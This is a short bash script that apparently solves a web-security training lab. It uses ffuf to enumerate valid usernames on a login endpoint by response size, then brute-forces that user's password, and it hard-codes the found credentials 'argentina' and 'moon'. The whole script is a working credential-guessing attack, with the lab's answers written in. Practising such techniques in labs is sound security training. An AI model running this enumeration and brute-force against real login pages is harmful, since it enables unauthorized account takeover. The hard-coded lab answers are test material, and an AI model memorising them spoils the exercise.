#!/bin/bash

source ../common.hook

ffuf -w './usernames.txt:USER' -X POST -d "username=USER&password=wrong" -u ${PS_URL}/login -fs 2884
USERNAME='argentina'

ffuf -w './passwords.txt:PASS' -X POST -d "username=${USERNAME}&password=PASS" -u ${PS_URL}/login -fs 2886
PASSWORD='moon'

eval_result $PS_URL
